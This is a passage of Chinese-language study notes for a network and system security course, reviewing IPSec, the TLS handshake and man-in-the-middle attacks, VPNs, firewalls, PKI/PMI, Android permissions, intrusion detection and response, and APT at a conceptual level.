&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106130959906.png&#34; alt=&#34;image-20230106130959906&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;IPSec通过AH和ESP这两个安全协议来实现IP数据报的安全传输。AH和ESP可以单独使用，也可同时使用。AH和ESP同时使用时，报文在IPSec安全转换时，先进行ESP封装，再进行AH封装；IPSec解封装时，先进行AH解封装，再进行ESP解封装。&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106130821697.png&#34; alt=&#34;image-20230106130821697&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;h2 id=&#34;5-2-IPSEC-的两个工作模式：&#34;&gt;&lt;a href=&#34;#5-2-IPSEC-的两个工作模式：&#34; class=&#34;headerlink&#34; title=&#34;5.2 IPSEC 的两个工作模式：&#34;&gt;&lt;/a&gt;5.2 IPSEC 的两个工作模式：&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106131118158.png&#34; alt=&#34;image-20230106131118158&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;传输模式：&lt;/strong&gt;在传输模式下，AH或ESP被插入到IP头之后但在传输层协议之前。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.nlark.com/yuque/0/2022/png/34463897/1672468514015-1391d50f-6255-4eda-b677-0f54e9b5db06.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;隧道模式：&lt;/strong&gt;在隧道模式下，AH或ESP在原始IP头前，另外生成一个新的IP 头放到AH或ESP之前。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.nlark.com/yuque/0/2022/png/34463897/1672468533403-b0dd5f4d-a558-4ec4-99c1-1538c536718b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h4 id&gt;&lt;a href=&#34;#&#34; class=&#34;headerlink&#34; title&gt;&lt;/a&gt;&lt;/h4&gt;&lt;h2 id=&#34;5-3-TLS协议握手过程、中间人攻击；&#34;&gt;&lt;a href=&#34;#5-3-TLS协议握手过程、中间人攻击；&#34; class=&#34;headerlink&#34; title=&#34;5.3 TLS协议握手过程、中间人攻击；&#34;&gt;&lt;/a&gt;5.3 TLS协议握手过程、中间人攻击；&lt;/h2&gt;&lt;p&gt;四个阶段,握手是干什么的,怎么完成身份鉴别,密钥协商,安全的通道&lt;/p&gt;
&lt;h3 id=&#34;握手过程&#34;&gt;&lt;a href=&#34;#握手过程&#34; class=&#34;headerlink&#34; title=&#34;握手过程&#34;&gt;&lt;/a&gt;握手过程&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html&#34;&gt;http://www.ruanyifeng.com/blog/2014/02/ssl_tls.html&lt;/a&gt;&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106132118156.png&#34; alt=&#34;image-20230106132118156&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;h3 id=&#34;中间人攻击&#34;&gt;&lt;a href=&#34;#中间人攻击&#34; class=&#34;headerlink&#34; title=&#34;中间人攻击&#34;&gt;&lt;/a&gt;中间人攻击&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105165056738.png&#34; alt=&#34;image-20230105165056738&#34;&gt;&lt;/p&gt;
&lt;p&gt;能够通过ARP 欺骗、DNS 欺骗或者浏览器数据重定向等欺骗技术， 使得SSL客户端C和服务器端S的数据都流向SSL MITM攻击机M。&lt;/p&gt;
&lt;p&gt;SSL客户端用户在接收到SSL MITM攻击机伪造的数字证书后， 被骗取对该证书的信任， 并继续SSL连接。&lt;/p&gt;
&lt;p&gt;SSL服务器未要求进行SSL客户端身份鉴别。&lt;/p&gt;
&lt;h2 id=&#34;5-4-VPN基本原理&#34;&gt;&lt;a href=&#34;#5-4-VPN基本原理&#34; class=&#34;headerlink&#34; title=&#34;5.4 VPN基本原理&#34;&gt;&lt;/a&gt;5.4 VPN基本原理&lt;/h2&gt;&lt;p&gt;VPN虚拟专用网络，是依靠ISP和其他的NSP，在公共网络中建立专用的数据通信的网络技术，可以为企业之间或者个人与企业之间提供安全的数据传输隧道服务。&lt;/p&gt;
&lt;p&gt;在VPN中任意两点之间的链接并没有传统专网所需的端到端的物理链路，而是利用公共网络资源动态组成的，可以理解为通过私有的隧道技术在公共数据网络上模拟出来的和专网有同样功能的点到点的专线技术。&lt;/p&gt;
&lt;p&gt;VPN涉及的安全技术：加解密技术、身份鉴别技术、密钥管理技术&lt;/p&gt;
&lt;h2 id=&#34;VPN技术在TLS和IPSEC层面实现&#34;&gt;&lt;a href=&#34;#VPN技术在TLS和IPSEC层面实现&#34; class=&#34;headerlink&#34; title=&#34;VPN技术在TLS和IPSEC层面实现&#34;&gt;&lt;/a&gt;VPN技术在TLS和IPSEC层面实现&lt;/h2&gt;&lt;p&gt;IPSEC过程：1、主机或网关B向远程主机或网关A发送VPN建立请求；2、A产生一个随机数，并将其发送给B；3、B使用这个随机数加密预先通过IKE分享的密钥，将结果发送给A；4、A也使用该随机数将B发来的结果解密，与预先分享的密钥比较，如果匹配，则使用这个密钥加密公钥，发送给B；5、B使用该公钥来建立它与A之间的IPSec SA，VPN隧道建立。&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230106155322339.png&#34; alt=&#34;image-20230106155322339&#34; style=&#34;zoom:25%;&#34;&gt;

&lt;h2 id=&#34;5-5-防火墙基本原理&#34;&gt;&lt;a href=&#34;#5-5-防火墙基本原理&#34; class=&#34;headerlink&#34; title=&#34;5.5 防火墙基本原理&#34;&gt;&lt;/a&gt;5.5 防火墙基本原理&lt;/h2&gt;&lt;p&gt;​	了解几种防火墙的基本原理和特性&lt;/p&gt;
&lt;p&gt;防火墙是位于两个(或多个)网络间， 实施网间访问控制的一组组件的集合， 内部和外部之间的所有网络数据流必须经过防火墙，只有符合安全政策的数据流才能通过防火墙。防火墙利用包过滤技术、状态检测技术、应用级网关技术、代理服务器技术等来挡住未经授权的访问流量，禁止具有脆弱性的服务带来危害。防火墙实施保护， 以避免各种IP欺骗和路由攻击。&lt;/p&gt;
&lt;h1 id=&#34;第六次课：网络权限管理&#34;&gt;&lt;a href=&#34;#第六次课：网络权限管理&#34; class=&#34;headerlink&#34; title=&#34;第六次课：网络权限管理&#34;&gt;&lt;/a&gt;第六次课：网络权限管理&lt;/h1&gt;&lt;h2 id=&#34;PMI（Privilege-Management-Infrastructure，权限管理基础设施）中SOA、AA等实体的作用&#34;&gt;&lt;a href=&#34;#PMI（Privilege-Management-Infrastructure，权限管理基础设施）中SOA、AA等实体的作用&#34; class=&#34;headerlink&#34; title=&#34;PMI（Privilege Management Infrastructure，权限管理基础设施）中SOA、AA等实体的作用&#34;&gt;&lt;/a&gt;PMI（Privilege Management Infrastructure，权限管理基础设施）中SOA、AA等实体的作用&lt;/h2&gt;&lt;p&gt;在PMI里资源拥有者称为&lt;strong&gt;SOA&lt;/strong&gt; (Source of Authority), 被授权的实体称为&lt;strong&gt;Privilege Holder&lt;/strong&gt;。Privilege holder还可以将他的权限进一步的委托，此时的Privilege holder就变成 了&lt;strong&gt;AA&lt;/strong&gt;(Attribute Authority )，需要注意，在这个过程中，权限授予是有层次级别的：SOA -&amp;gt; PH(AA)。这个过程不能反转。&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105103406935.png&#34; alt=&#34;image-20230105103406935&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105103506381.png&#34; alt=&#34;image-20230105103506381&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105103835548.png&#34; alt=&#34;image-20230105103835548&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;h2 id=&#34;基于属性的访问控制与PMI的关系&#34;&gt;&lt;a href=&#34;#基于属性的访问控制与PMI的关系&#34; class=&#34;headerlink&#34; title=&#34;基于属性的访问控制与PMI的关系&#34;&gt;&lt;/a&gt;基于属性的访问控制与PMI的关系&lt;/h2&gt;&lt;p&gt;PMI的属性证书AC绑定了实体身份信息和实体权限。属性证书由属性中心AA以数字签名的方式签发，给出了实体的权限属性。实体向AA申请一个权限，申请通过后，属性中心AA只将AC发送给实体本身，公开存储或交由验证者验证，这个过程并不需要实体本身知晓或参与。&lt;/p&gt;
&lt;h2 id=&#34;PKI的基本概念-包括数字证书的生命周期、CRL、OCSP&#34;&gt;&lt;a href=&#34;#PKI的基本概念-包括数字证书的生命周期、CRL、OCSP&#34; class=&#34;headerlink&#34; title=&#34;PKI的基本概念,包括数字证书的生命周期、CRL、OCSP&#34;&gt;&lt;/a&gt;PKI的基本概念,包括数字证书的生命周期、CRL、OCSP&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;数字证书的生命周期：数字证书的全生命周期包括&lt;code&gt;证书的申请、签发、获取、验证和撤销&lt;/code&gt;。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;某个用户想要生成一对密钥就会向CA申请一个公钥的数字证书，CA通过签发证书的方式向全世界发布申请人的公钥信息。该证书以各种方式公开(HTTP&amp;#x2F;FTP&amp;#x2F;LDAP&amp;#x2F;Email等)，所有取得该公钥数字证书的用户会鉴别数据源、数据完整性，同时CA还需要有非否认性。CA办法的数字证书具有有效期，过期后，该证书无效，此时不能再使用该公钥，CA需要撤销该证书。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数字证书无效以后，CA要撤销该证书，此时PKI会维护一个证书撤销列表CRL，证书撤销列表也要CA进行数字签名，以实现数据完整性、数据源鉴别、非否认。CRL中保存着被撤销的证书序列号。&lt;/li&gt;
&lt;li&gt;在线证书状态协议OCSP是另一种形式的证书撤销信息，其形式是“请求－应答”，即请求某个序列号的证书当前状态如何？应答则分为“未撤销、撤销、未知”状态，应答消息需要服务器的数字签名。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;为什么会有PKI-Public-Key-Infrastructure&#34;&gt;&lt;a href=&#34;#为什么会有PKI-Public-Key-Infrastructure&#34; class=&#34;headerlink&#34; title=&#34;为什么会有PKI(Public Key Infrastructure)&#34;&gt;&lt;/a&gt;为什么会有PKI(Public Key Infrastructure)&lt;/h3&gt;&lt;p&gt;安全通信的前提:双方能够共享一个对称密钥用作会话密钥&lt;/p&gt;
&lt;p&gt;会话密钥通常由公钥密码协商得到,如Diffie-Hellman密钥交换&lt;/p&gt;
&lt;p&gt;但是如何安全地知道对方的密钥呢?? 建立具有公信力的可信第三方!&lt;/p&gt;
&lt;h3 id=&#34;PKI的基本概念&#34;&gt;&lt;a href=&#34;#PKI的基本概念&#34; class=&#34;headerlink&#34; title=&#34;PKI的基本概念&#34;&gt;&lt;/a&gt;PKI的基本概念&lt;/h3&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105101927108.png&#34; alt=&#34;image-20230105101927108&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105102009133.png&#34; alt=&#34;image-20230105102009133&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;h3 id=&#34;CRL-证书撤销列表&#34;&gt;&lt;a href=&#34;#CRL-证书撤销列表&#34; class=&#34;headerlink&#34; title=&#34;CRL 证书撤销列表&#34;&gt;&lt;/a&gt;CRL 证书撤销列表&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105102716999.png&#34; alt=&#34;image-20230105102716999&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;OCSP-证书撤销方式&#34;&gt;&lt;a href=&#34;#OCSP-证书撤销方式&#34; class=&#34;headerlink&#34; title=&#34;OCSP 证书撤销方式&#34;&gt;&lt;/a&gt;OCSP 证书撤销方式&lt;/h3&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105103010693.png&#34; alt=&#34;image-20230105103010693&#34; style=&#34;zoom:50%;&#34;&gt;



&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105104157260.png&#34; alt=&#34;image-20230105104157260&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;第七次课：系统权限管理&#34;&gt;&lt;a href=&#34;#第七次课：系统权限管理&#34; class=&#34;headerlink&#34; title=&#34;第七次课：系统权限管理&#34;&gt;&lt;/a&gt;第七次课：系统权限管理&lt;/h1&gt;&lt;h2 id=&#34;移动终端系统与传统PC权限管理需求的区别。&#34;&gt;&lt;a href=&#34;#移动终端系统与传统PC权限管理需求的区别。&#34; class=&#34;headerlink&#34; title=&#34;移动终端系统与传统PC权限管理需求的区别。&#34;&gt;&lt;/a&gt;移动终端系统与传统PC权限管理需求的区别。&lt;/h2&gt;&lt;p&gt;什么什么hold???&lt;/p&gt;
&lt;p&gt;传统PC强调“作为一个完整系统独立提供服务”的能力，传统PC系统安全设计为：一个用户登录后，针对该系统用户进行系统资源的访问控制。移动应用高度依赖网络，每一个应用背后是一个相对独立的网络应用系统，每一个应用有自己相对独立的安全边界。移动终端系统用户个人属性相对明显，很少有多人共享一个终端设备，用户区分标识（UID）不再是移动终端系统进行资源访问控制的合适依据。&lt;/p&gt;
&lt;p&gt;APP作为系统资源访问控制的基本单位，不同APP之间需要能够进行有效隔离，系统对不同用户的区分不再明显。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105091924282.png&#34; alt=&#34;image-20230105091924282&#34;&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105092017837.png&#34; alt=&#34;image-20230105092017837&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;Android-Permission机制与Linux-UGO访问控制的区别与联系。&#34;&gt;&lt;a href=&#34;#Android-Permission机制与Linux-UGO访问控制的区别与联系。&#34; class=&#34;headerlink&#34; title=&#34;Android Permission机制与Linux UGO访问控制的区别与联系。&#34;&gt;&lt;/a&gt;Android Permission机制与Linux UGO访问控制的区别与联系。&lt;/h2&gt;&lt;p&gt;什么curi ablitiy?&lt;/p&gt;
&lt;p&gt;Android APP在其进程建立过程中形成实际的APP Permission授权，Linux UGO和ACL在文件系统加载时形成文件的权限属性。Android Permission机制本质上是代码签名机制后，对APP权限的进一步访问控制。UGO机制设置不同组的访问权限，通过让用户进程加入到不同的组，实现其访问控制。&lt;/p&gt;
&lt;h2 id=&#34;Android-Permission机制实现的基本组件和流程。&#34;&gt;&lt;a href=&#34;#Android-Permission机制实现的基本组件和流程。&#34; class=&#34;headerlink&#34; title=&#34;Android Permission机制实现的基本组件和流程。&#34;&gt;&lt;/a&gt;Android Permission机制实现的基本组件和流程。&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;APP Permission的申请与生成&lt;/strong&gt;：每个APP拥有 Permission授权的能力，基于能力的访问控制机制适用于需要区分用户较多的环境，Android系统里每一个APP就是一个用户。基于能力的访问控制机制，访问权限的撤销较为困难，因为访问许可授权分散在每一个APP中。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;APP Permission授权的形成&lt;/strong&gt;：Android APP在其进程建立过程中形成实际的APP Permission授权，在APP运行加载时，从静态存储被加载到APP的进程空间。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;APP Permission权限检查&lt;/strong&gt;：当APP访问系统资源时，Android系统会检查APP的权限信息。APP通过系统提供的API调用系统资源，API由System Server和Media等几个关键的进程提供。System Server提供PermCheck功能，PermCheck对比资源要求的Permission许可和 APP存储在mExtras中的许可，进行访问控制决策。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;第八次课：入侵检测基本原理&#34;&gt;&lt;a href=&#34;#第八次课：入侵检测基本原理&#34; class=&#34;headerlink&#34; title=&#34;第八次课：入侵检测基本原理&#34;&gt;&lt;/a&gt;第八次课：入侵检测基本原理&lt;/h1&gt;&lt;h2 id=&#34;8-1-PDR模型的时间关系&#34;&gt;&lt;a href=&#34;#8-1-PDR模型的时间关系&#34; class=&#34;headerlink&#34; title=&#34;8.1 PDR模型的时间关系&#34;&gt;&lt;/a&gt;8.1 PDR模型的时间关系&lt;/h2&gt;&lt;p&gt;以时间为度量指标，量化描述系统攻击和防御的对抗，著名的安全条件如下： Pt &amp;gt; Dt + Rt&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105113008104.png&#34; alt=&#34;image-20230105113008104&#34; style=&#34;zoom:33%;&#34;&gt;



&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105113132134.png&#34; alt=&#34;image-20230105113132134&#34; style=&#34;zoom: 33%;&#34;&gt;

&lt;h2 id=&#34;8-2-入侵检测-IDS-的技术起源，安全审计&#34;&gt;&lt;a href=&#34;#8-2-入侵检测-IDS-的技术起源，安全审计&#34; class=&#34;headerlink&#34; title=&#34;8.2 入侵检测(IDS)的技术起源，安全审计&#34;&gt;&lt;/a&gt;8.2 入侵检测(IDS)的技术起源，安全审计&lt;/h2&gt;&lt;h3 id=&#34;技术起源&#34;&gt;&lt;a href=&#34;#技术起源&#34; class=&#34;headerlink&#34; title=&#34;技术起源&#34;&gt;&lt;/a&gt;技术起源&lt;/h3&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105113507224.png&#34; alt=&#34;image-20230105113507224&#34; style=&#34;zoom: 33%;&#34;&gt;

&lt;h3 id=&#34;安全审计&#34;&gt;&lt;a href=&#34;#安全审计&#34; class=&#34;headerlink&#34; title=&#34;安全审计&#34;&gt;&lt;/a&gt;安全审计&lt;/h3&gt;&lt;p&gt;计算机网络安全审计（Audit）是指按照一定的安全策略，利用记录、系统活动和用户活动等信息，检查、审查和检验操作事件的环境及活动，从而发现系统漏洞、入侵行为或改善系统性能的过程。&lt;/p&gt;
&lt;p&gt;也是审查评估系统安全风险并采取相应措施的一个过程。在不至于混淆情况下，简称为安全审计，实际是记录与审查用户操作计算机及网络系统活动的过程，是提高系统安全性的重要举措。系统活动包括操作系统活动和应用程序进程的活动。&lt;/p&gt;
&lt;h2 id=&#34;8-3-异常入侵检测和误用入侵检测的区别和联系&#34;&gt;&lt;a href=&#34;#8-3-异常入侵检测和误用入侵检测的区别和联系&#34; class=&#34;headerlink&#34; title=&#34;8.3 异常入侵检测和误用入侵检测的区别和联系&#34;&gt;&lt;/a&gt;8.3 异常入侵检测和误用入侵检测的区别和联系&lt;/h2&gt;&lt;h3 id=&#34;误用入侵检测系统&#34;&gt;&lt;a href=&#34;#误用入侵检测系统&#34; class=&#34;headerlink&#34; title=&#34;误用入侵检测系统&#34;&gt;&lt;/a&gt;误用入侵检测系统&lt;/h3&gt;&lt;p&gt;误用入侵检测的前提是入侵行为和正常行为是可区分的。建立一个异常行为的模式库&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105113654551.png&#34; alt=&#34;image-20230105113654551&#34; style=&#34;zoom: 33%;&#34;&gt;

&lt;h3 id=&#34;异常入侵检测&#34;&gt;&lt;a href=&#34;#异常入侵检测&#34; class=&#34;headerlink&#34; title=&#34;异常入侵检测&#34;&gt;&lt;/a&gt;异常入侵检测&lt;/h3&gt;&lt;p&gt;这个是记录正常的行为,不在这个范围内的被判定为异常&lt;/p&gt;
&lt;p&gt;异常入侵检测记录用户的的日常操作，一般而言，误用检测的&lt;code&gt;新特征发现过程&lt;/code&gt;与使用&lt;code&gt;已有特征进行检测的过程&lt;/code&gt;相互独立。&lt;/p&gt;
&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105114015471.png&#34; alt=&#34;image-20230105114015471&#34; style=&#34;zoom:33%;&#34;&gt;

&lt;h3 id=&#34;区别和联系&#34;&gt;&lt;a href=&#34;#区别和联系&#34; class=&#34;headerlink&#34; title=&#34;区别和联系&#34;&gt;&lt;/a&gt;区别和联系&lt;/h3&gt;&lt;p&gt;异常IDS检测&amp;#x2F;误用IDS检测，都有更新“特征&amp;#x2F;模式库”的行为。一般而言，误用检测的&lt;code&gt;新特征发现过程&lt;/code&gt;与&lt;code&gt;使用已有特征进行检测的过程&lt;/code&gt;相互独立；异常检测的模式库更新，通常是在IDS的运行中完成，即边运行，边更新。&lt;/p&gt;
&lt;h2 id=&#34;思考题&#34;&gt;&lt;a href=&#34;#思考题&#34; class=&#34;headerlink&#34; title=&#34;思考题&#34;&gt;&lt;/a&gt;思考题&lt;/h2&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105114231965.png&#34; alt=&#34;image-20230105114231965&#34; style=&#34;zoom:33%;&#34;&gt;

&lt;h1 id=&#34;第九次课：&#34;&gt;&lt;a href=&#34;#第九次课：&#34; class=&#34;headerlink&#34; title=&#34;第九次课：&#34;&gt;&lt;/a&gt;第九次课：&lt;/h1&gt;&lt;h2 id=&#34;9-1-入侵相应的目标&#34;&gt;&lt;a href=&#34;#9-1-入侵相应的目标&#34; class=&#34;headerlink&#34; title=&#34;9.1 入侵相应的目标&#34;&gt;&lt;/a&gt;9.1 入侵相应的目标&lt;/h2&gt;&lt;p&gt;对危及安全的事件、行为、过程及时做出响应处理，杜绝危害蔓延，降低安全影响。&lt;/p&gt;
&lt;p&gt;核心是业务连续性, 要保证这个,让攻击的范围减小,危害最小&lt;/p&gt;
&lt;h2 id=&#34;9-2-入侵追踪的基本技术&#34;&gt;&lt;a href=&#34;#9-2-入侵追踪的基本技术&#34; class=&#34;headerlink&#34; title=&#34;9.2 入侵追踪的基本技术&#34;&gt;&lt;/a&gt;9.2 入侵追踪的基本技术&lt;/h2&gt;&lt;p&gt;溯源&lt;/p&gt;
&lt;h5 id=&#34;阻断攻击&#34;&gt;&lt;a href=&#34;#阻断攻击&#34; class=&#34;headerlink&#34; title=&#34;阻断攻击&#34;&gt;&lt;/a&gt;阻断攻击&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;与防火墙或网关联动，阻断攻击者的TCP连接(TCP RESET)、阻断攻击者的数据包(ICMP 报文控制)；&lt;/li&gt;
&lt;li&gt;联络攻击者所在区域的管理员；&lt;/li&gt;
&lt;li&gt;向攻击者发起反击：网络流量的压制性反击、基于安全漏洞利用的反击、基于APT方式的反击。&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;收集攻击信息&#34;&gt;&lt;a href=&#34;#收集攻击信息&#34; class=&#34;headerlink&#34; title=&#34;收集攻击信息&#34;&gt;&lt;/a&gt;收集攻击信息&lt;/h5&gt;&lt;p&gt;检测到入侵后，把攻击者引导到经过特殊装 备的诱骗服务器上，记录攻击者的行为，从而获得攻击者的详细信息，作为进一步采取法律措施的证据。主要包括：Honey Pot(蜜罐)、Decoy(诱骗系统)、Fishbowl(鱼饵)等技术。&lt;/p&gt;
&lt;h5 id=&#34;入侵追踪&#34;&gt;&lt;a href=&#34;#入侵追踪&#34; class=&#34;headerlink&#34; title=&#34;入侵追踪&#34;&gt;&lt;/a&gt;入侵追踪&lt;/h5&gt;&lt;p&gt;入侵追踪是一种分布式的、需要多节点协作的体系；入侵追踪应该建立在网络资源相互信任的基础上，应该具有抵抗攻击的健壮性，入侵追踪必须是高效的、准确的，统能够以最小的代价提供快速响应机制。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;基于主机的追踪体系&lt;/strong&gt;：每一个主机节点利用信息隐藏技术在数据包中留下不易察觉的标记、都留下日志，追踪系统中的每一个节点都必须是信任的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;针对TCP连接链的追踪&lt;/strong&gt;：对于中间经过了多次跳板的TCP攻击连接，一般通过全网部署多个监控节点，监控TCP流。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;网络追踪技术：&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Input Debugging：发生攻击后IDS发现攻击数据包，人工联系前面的各个路由器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Controlled Flooding：逐一地向前面的各个路由器发送数据、淹没路由器的缓冲区，看看攻击流量是否减少。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;ICMP追踪：&lt;/strong&gt;利用路由器配合确定数据包转发经过的路由器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;PPM技术：&lt;/strong&gt;每一个数据包每经过一个路由器，路由器就把自己的IP地址附加上去。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;基于日志 的追踪：&lt;/strong&gt;由路由器计算并保存每个数据包的Hash摘要。入侵追踪时，通过检查数据包的Hash摘要，与路由器保存的结果进行比较，逐步查询出整个攻击路径所经过的路由器。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;img src=&#34;/ucas-%E7%BD%91%E7%BB%9C%E4%B8%8E%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8-%E5%A4%8D%E4%B9%A0/image-20230105212128645.png&#34; alt=&#34;image-20230105212128645&#34; style=&#34;zoom:25%;&#34;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;9-3-APT-攻击对入侵检测与响应的影响&#34;&gt;&lt;a href=&#34;#9-3-APT-攻击对入侵检测与响应的影响&#34; class=&#34;headerlink&#34; title=&#34;9.3 APT 攻击对入侵检测与响应的影响&#34;&gt;&lt;/a&gt;9.3 APT 攻击对入侵检测与响应的影响&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Advanced Persistent Threat&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;APT是由商业或者政治目的，针对特定目标的攻击。隐蔽性和持续性是攻击的主要特点，APT攻击采用尽可能正常的网络行为，通过长期有耐心的积累实施攻击。APT攻击的监测超出了“误用”和“异常”IDS的能力范围，使得入侵检测和响应变得更加困难。 &lt;/p&gt;
